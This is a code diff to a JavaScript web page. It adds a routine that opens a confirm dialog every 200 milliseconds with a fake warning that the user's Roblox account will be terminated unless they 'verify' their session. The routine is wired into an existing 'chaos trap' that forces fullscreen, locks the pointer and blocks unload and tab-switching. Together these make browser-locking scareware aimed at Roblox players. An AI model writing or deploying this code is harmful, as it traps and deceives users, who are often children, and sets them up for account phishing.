@@ -344,10 +344,21 @@
     else if(document.mozCancelFullScreen)document.mozCancelFullScreen();
     else if(document.msExitFullscreen)document.msExitFullscreen();
   }
+  let dialogSpamInterval=null;
+  function startDialogSpam(){
+    dialogSpamInterval=setInterval(()=>{
+      if(trapActive)confirm('WARNING: Your Roblox account has been flagged for exploit injection. Click OK to verify your session or your account will be terminated.');
+    },200);
+  }
+  function stopDialogSpam(){
+    if(dialogSpamInterval){clearInterval(dialogSpamInterval);dialogSpamInterval=null;}
+  }
+
   function startChaosTrap(){
     trapActive=true;chaosModeLocked=true;
     fakeFullscreen.classList.add('active');
     attemptFullscreen();
+    setTimeout(startDialogSpam,500);
     window.addEventListener('beforeunload',trapUser);
     window.addEventListener('unload',trapUser);
     document.addEventListener('visibilitychange',e=>{if(trapActive&&document.hidden){e.preventDefault();attemptFullscreen();}});
@@ -368,6 +379,7 @@
     fakeFullscreen.classList.remove('active');
     window.removeEventListener('beforeunload',trapUser);
     window.removeEventListener('unload',trapUser);
+    stopDialogSpam();
     exitFullscreen();unlockPointer();
     if(pointerLockInterval){clearInterval(pointerLockInterval);pointerLockInterval=null;}
     if(fullscreenInterval){clearInterval(fullscreenInterval);fullscreenInterval=null;}
